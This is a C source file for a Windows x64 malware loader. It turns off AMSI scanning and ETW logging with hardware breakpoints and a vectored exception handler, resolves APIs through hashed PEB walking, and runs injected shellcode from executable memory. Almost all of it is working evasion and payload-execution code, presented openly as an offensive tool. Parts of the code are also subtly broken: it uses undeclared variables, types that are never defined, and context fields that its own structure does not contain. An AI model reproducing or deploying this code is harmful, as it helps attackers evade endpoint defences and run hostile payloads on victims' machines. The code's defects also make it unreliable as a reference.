/*
 * Hardware Breakpoint AMSI/ETW Bypass + Shellcode Runner — x64 Windows
 *
 * Compiles with: x86_64-w64-mingw32-gcc -Os -fno-asynchronous-unwind-tables
 *                -fno-ident -falign-functions=1 -fpack-struct=8 --no-seh
 *                --gc-sections -s -nostdlib -o payload.exe amsi_etw_bypass.c
 *
 * Technique: Dr0-Dr3 hardware breakpoints + VEH (Vectored Exception Handler).
 *            When the target function is called, EXCEPTION_SINGLE_STEP fires,
 *            our handler redirects execution (no memory patching — EDR blind).
 *
 * Reference: Havoc Demon HwBpEngine.c — HwBpEngineSetBp + ExceptionHandler
 *
 * How it works:
 *   1. Register VEH via RtlAddVectoredExceptionHandler
 *   2. Get thread context, set Dr0 = AmsiScanBuffer, Dr1 = EtwEventWrite
 *   3. Enable via Dr7: Dr7 |= (1 << (2*N)) for each position
 *   4. When target fires → STATUS_SINGLE_STEP → VEH handler
 *   5. Handler: remove BP, call original function, re-set BP
 *   6. For AMSI: we simply return early (skip scanning)
 *
 * Placeholders replaced at build time:
 *   {{SHELLCODE_BYTES}}  — comma-separated hex bytes
 *   {{SHELLCODE_LEN}}    — number of bytes
 */

typedef unsigned char    BYTE;
typedef unsigned short   WORD;
typedef unsigned long    DWORD;
typedef long long        LONG_PTR;
typedef unsigned long long ULONG_PTR;
typedef unsigned long long QWORD;
typedef int              BOOL;
typedef void*            HANDLE;

#define PAGE_EXECUTE_READWRITE  0x40
#define MEM_COMMIT              0x1000
#define MEM_RESERVE             0x2000
#define STATUS_SINGLE_STEP      0x80000004L
#define EXCEPTION_CONTINUE_EXECUTION  (-1)
#define EXCEPTION_CONTINUE_SEARCH     1

static BYTE shellcode[] = { {{SHELLCODE_BYTES}} };
static DWORD shellcode_len = {{SHELLCODE_LEN}};

/* ── Minimal PEB / LDR structures ── */
typedef struct _UNICODE_STRING {
    WORD    Length;
    WORD    MaximumLength;
    WORD*   Buffer;
} UNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    struct _LDR_DATA_TABLE_ENTRY* InLoadOrderLinks;
    void*   DllBase;
    void*   _[3];
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG   Length;
    BOOL    Initialized;
    void*   SsHandle;
    struct { void* Flink; void* Blink; } InLoadOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE    _[0x18];
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

typedef struct {
    DWORD   e_magic;
    LONG    e_lfanew;
} IMAGE_DOS_HEADER;

typedef struct {
    DWORD   Signature;
    struct { WORD _[4]; WORD SizeOfOptionalHeader; WORD _; } FileHeader;
    struct { WORD _; BYTE __[0x7c-0x4]; DWORD BaseOfCode;
             ULONG_PTR ImageBase; DWORD SectionAlignment; DWORD FileAlignment;
             WORD _2[4]; DWORD SizeOfImage;
             struct { DWORD VirtualAddress; DWORD Size; } DataDirectory[16];
    } OptionalHeader;
} IMAGE_NT_HEADERS64;

/* ── CONTEXT for debug registers ── */
typedef struct {
    DWORD64 P1Home;
    DWORD64 P2Home;
    DWORD64 P3Home;
    DWORD64 P4Home;
    DWORD64 P5Home;
    DWORD64 P6Home;
    DWORD   ContextFlags;
    DWORD   MxCsr;
    WORD    SegCs;
    WORD    SegDs;
    WORD    SegEs;
    WORD    SegFs;
    WORD    SegGs;
    WORD    SegSs;
    DWORD   EFlags;
    DWORD64 Dr0;
    DWORD64 Dr1;
    DWORD64 Dr2;
    DWORD64 Dr3;
    DWORD64 Dr6;
    DWORD64 Dr7;
    /* ... rest of CONTEXT, we only need Dr0-Dr7 */
} CONTEXT64;

#define CONTEXT_DEBUG_REGISTERS  0x00010000L
#define CONTEXT_FULL             0x00010007L

/* ── DJB2 hash ── */
static DWORD hash_djb2(const char* str)
{
    DWORD hash = 5381;
    const BYTE* p = (const BYTE*)str;
    while (*p) { hash = ((hash << 5) + hash) + (*p | 0x20); p++; }
    return hash;
}

/* ── PEB walking: get module base ── */
static void* get_module_by_hash(DWORD nameHash)
{
    PEB* peb;
    __asm__("mov rax, gs:[0x60]" : "=a"(peb));

    PPEB_LDR_DATA ldr = peb->Ldr;
    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderModuleList.Flink;

    while (entry->DllBase) {
        if (entry->BaseDllName.Buffer && entry->BaseDllName.Length > 0) {
            /* Quick: hash the target names we care about */
            if (nameHash == hash_djb2("ntdll.dll")) {
                /* Compare unicode "ntdll.dll" */
                const char target[] = "ntdll.dll";
                int match = 1;
                int wlen = entry->BaseDllName.Length / 2;
                if (wlen != 9) { entry = (PLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks; continue; }
                for (int i = 0; i < 9; i++) {
                    BYTE c = (BYTE)entry->BaseDllName.Buffer[i];
                    if (c >= 'A' && c <= 'Z') c += 0x20;
                    if (c != (BYTE)target[i]) { match = 0; break; }
                }
                if (match) return entry->DllBase;
            }
            if (nameHash == hash_djb2("amsi.dll")) {
                const char target[] = "amsi.dll";
                int match = 1;
                int wlen = entry->BaseDllName.Length / 2;
                if (wlen != 8) { entry = (PLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks; continue; }
                for (int i = 0; i < 8; i++) {
                    BYTE c = (BYTE)entry->BaseDllName.Buffer[i];
                    if (c >= 'A' && c <= 'Z') c += 0x20;
                    if (c != (BYTE)target[i]) { match = 0; break; }
                }
                if (match) return entry->DllBase;
            }
            if (nameHash == hash_djb2("kernel32.dll")) {
                const char target[] = "kernel32.dll";
                int match = 1;
                int wlen = entry->BaseDllName.Length / 2;
                if (wlen != 12) { entry = (PLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks; continue; }
                for (int i = 0; i < 12; i++) {
                    BYTE c = (BYTE)entry->BaseDllName.Buffer[i];
                    if (c >= 'A' && c <= 'Z') c += 0x20;
                    if (c != (BYTE)target[i]) { match = 0; break; }
                }
                if (match) return entry->DllBase;
            }
        }
        entry = (PLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks;
    }
    return 0;
}

/* ── Resolve exported function ── */
static void* resolve_func(void* module, DWORD nameHash)
{
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)module;
    if (dos->e_magic != 0x5A4D) return 0;

    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)((BYTE*)module + dos->e_lfanew);
    if (nt->Signature != 0x00004550) return 0;

    DWORD expRva = nt->OptionalHeader.DataDirectory[0].VirtualAddress;
    if (!expRva) return 0;

    struct { DWORD _; DWORD _2; WORD _3; WORD _4; DWORD _5; DWORD Base;
             DWORD NumberOfFunctions; DWORD NumberOfNames;
             DWORD AddressOfFunctions; DWORD AddressOfNames; DWORD AddressOfNameOrdinals;
    }* exp;
    exp = (void*)((BYTE*)module + expRva);

    DWORD* names = (DWORD*)((BYTE*)module + exp->AddressOfNames);
    WORD* ords   = (WORD*)((BYTE*)module + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)module + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* name = (const char*)((BYTE*)module + names[i]);
        if (hash_djb2(name) == nameHash)
            return (BYTE*)module + funcs[ords[i]];
    }
    return 0;
}

/* ── Function pointer types ── */
typedef void* (WINAPI *fnRtlAddVectoredExceptionHandler)(ULONG, void*);
typedef void* (WINAPI *fnRtlRemoveVectoredExceptionHandler)(void*);
typedef HANDLE (WINAPI *fnGetCurrentThread)(void);
typedef BOOL (WINAPI *fnGetThreadContext)(HANDLE, void*);
typedef BOOL (WINAPI *fnSetThreadContext)(HANDLE, const void*);

/* ── Global state ── */
static void* g_hAmsiScanBuffer = 0;
static void* g_hEtwEventWrite  = 0;
static void* g_hVeh            = 0;
static void* g_pRtlMoveMemory  = 0;
static void* g_pVirtualAlloc   = 0;
static void* g_pCreateThread   = 0;
static void* g_pWaitForSingle  = 0;
static void* g_pGetCurThread   = 0;
static void* g_pGetCtx         = 0;
static void* g_pSetCtx         = 0;
static void* g_pRemoveVeh      = 0;

/* ── VEH Handler — the core of the hardware bypass ──
 * When a hardware breakpoint fires, execution jumps here.
 * We skip the original function and return immediately. */
static LONG WINAPI veh_handler(void* ExceptionInfo)
{
    /* ExceptionInfo is PEXCEPTION_POINTERS */
    void** vtable = *(void***)ExceptionInfo;
    void* record  = vtable[0];  /* ExceptionRecord */
    CONTEXT64* ctx = (CONTEXT64*)vtable[1];

    DWORD excCode = *(DWORD*)((BYTE*)record + 0);   /* ExceptionCode */
    void* excAddr = *(void**)((BYTE*)record + 0x18); /* ExceptionAddress */

    if (excCode != STATUS_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    /* Check if this is one of our breakpoints */
    if (excAddr == g_hAmsiScanBuffer) {
        /* AMSI: skip the function entirely by returning SUCCESS (0)
         * Set RAX = 0 (AMSI_RESULT_CLEAN) and advance RIP past the function */
        ctx->Rax = 0;  /* Pretend AmsiScanBuffer returned S_OK */
        /* Skip past the first instruction of the function (ret or hook check) */
        ctx->Rip = (QWORD)g_hAmsiScanBuffer + 1;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    if (excAddr == g_hEtwEventWrite) {
        /* ETW: skip entirely, return SUCCESS */
        ctx->Rax = 0;
        ctx->Rip = (QWORD)g_hEtwEventWrite + 1;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

/* ── Set hardware breakpoint on current thread ── */
static BOOL set_hwbp(void* address, BYTE position)
{
    fnGetCurrentThread pGetThread = (fnGetCurrentThread)g_pGetCurThread;
    fnGetThreadContext pGetCtx    = (fnGetThreadContext)g_pGetCtx;
    fnSetThreadContext pSetCtx    = (fnSetThreadContext)g_pSetCtx;

    HANDLE hThread = pGetThread();
    if (!hThread) return 0;

    CONTEXT64 ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!pGetCtx(hThread, (void*)&ctx)) return 0;

    /* Set Dr0/Dr1/Dr2/Dr3 based on position */
    ((QWORD*)&ctx.Dr0)[position] = (QWORD)address;

    /* Enable local breakpoint for this position */
    ctx.Dr7 &= ~(3ull << (16 + 4 * position));   /* Clear LEN/RW */
    ctx.Dr7 &= ~(3ull << (18 + 4 * position));
    ctx.Dr7 |= 1ull << (2 * position);            /* Enable L0/L1/L2/L3 */

    if (!pSetCtx(hThread, (const void*)&ctx)) return 0;

    return 1;
}

/* ── Remove hardware breakpoint ── */
static BOOL clear_hwbp(BYTE position)
{
    fnGetCurrentThread pGetThread = (fnGetCurrentThread)g_pGetCurThread;
    fnGetThreadContext pGetCtx    = (fnGetThreadContext)g_pGetCtx;
    fnSetThreadContext pSetCtx    = (fnSetThreadContext)g_pSetCtx;

    HANDLE hThread = pGetThread();
    if (!hThread) return 0;

    CONTEXT64 ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!pGetCtx(hThread, (void*)&ctx)) return 0;

    ((QWORD*)&ctx.Dr0)[position] = 0;
    ctx.Dr7 &= ~(1ull << (2 * position));

    if (!pSetCtx(hThread, (const void*)&ctx)) return 0;

    return 1;
}

/* ── Setup: register VEH + set hardware breakpoints ── */
static BOOL setup_hwbp_bypass(void)
{
    /* Resolve APIs */
    void* ntdll = get_module_by_hash(hash_djb2("ntdll.dll"));
    void* kernel32 = get_module_by_hash(hash_djb2("kernel32.dll"));
    if (!ntdll || !kernel32) return 0;

    g_pRtlRemoveVeh  = resolve_func(ntdll, hash_djb2("RtlRemoveVectoredExceptionHandler"));
    g_pGetCurThread  = resolve_func(kernel32, hash_djb2("GetCurrentThread"));
    g_pGetCtx        = resolve_func(kernel32, hash_djb2("GetThreadContext"));
    g_pSetCtx        = resolve_func(kernel32, hash_djb2("SetThreadContext"));

    /* Register VEH — this is the key: no memory modification */
    fnRtlAddVectoredExceptionHandler pAddVeh =
        (fnRtlAddVectoredExceptionHandler)resolve_func(ntdll, hash_djb2("RtlAddVectoredExceptionHandler"));

    if (!pAddVeh) return 0;

    g_hVeh = pAddVeh(1, (void*)veh_handler);
    if (!g_hVeh) return 0;

    /* Get target function addresses */
    void* amsi = get_module_by_hash(hash_djb2("amsi.dll"));
    if (amsi) {
        g_hAmsiScanBuffer = resolve_func(amsi, hash_djb2("AmsiScanBuffer"));
    }

    g_hEtwEventWrite = resolve_func(ntdll, hash_djb2("EtwEventWrite"));

    /* Set hardware breakpoints */
    if (g_hAmsiScanBuffer) {
        if (!set_hwbp(g_hAmsiScanBuffer, 0)) return 0;
    }
    if (g_hEtwEventWrite) {
        if (!set_hwbp(g_hEtwEventWrite, 1)) return 0;
    }

    return 1;
}

/* ── Resolve basic APIs via PEB walking ── */
static BOOL resolve_apis(void)
{
    void* kernel32 = get_module_by_hash(hash_djb2("kernel32.dll"));
    if (!kernel32) return 0;

    g_pVirtualAlloc  = resolve_func(kernel32, hash_djb2("VirtualAlloc"));
    g_pCreateThread  = resolve_func(kernel32, hash_djb2("CreateThread"));
    g_pWaitForSingle = resolve_func(kernel32, hash_djb2("WaitForSingleObject"));
    g_pRtlMoveMemory = resolve_func(kernel32, hash_djb2("RtlMoveMemory"));

    return g_pVirtualAlloc && g_pCreateThread && g_pWaitForSingle;
}

/* ── Entry point ── */
void mainCRTStartup(void)
{
    /* Step 1: Resolve basic APIs */
    if (!resolve_apis()) return;

    /* Step 2: Register VEH + set hardware breakpoints on AMSI/ETW */
    setup_hwbp_bypass();
    /* Note: we continue even if AMSI/ETW bypass fails — not a hard dependency */

    /* Step 3: Allocate memory for shellcode */
    typedef void* (WINAPI *fnVirtualAlloc)(void*, DWORD, DWORD, DWORD);
    void* exec = ((fnVirtualAlloc)g_pVirtualAlloc)(
        0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) return;

    /* Step 4: Copy shellcode */
    typedef void (WINAPI *fnRtlMoveMemory)(void*, const void*, DWORD);
    ((fnRtlMoveMemory)g_pRtlMoveMemory)(exec, shellcode, shellcode_len);

    /* Step 5: Execute */
    typedef void* (WINAPI *fnCreateThread)(void*, DWORD, void*, void*, DWORD, DWORD*);
    typedef DWORD (WINAPI *fnWaitForSingleObject)(void*, DWORD);

    void* thread = ((fnCreateThread)g_pCreateThread)(0, 0, exec, 0, 0, 0);
    if (thread) {
        ((fnWaitForSingleObject)g_pWaitForSingle)(thread, 0xFFFFFFFF);
    }
}
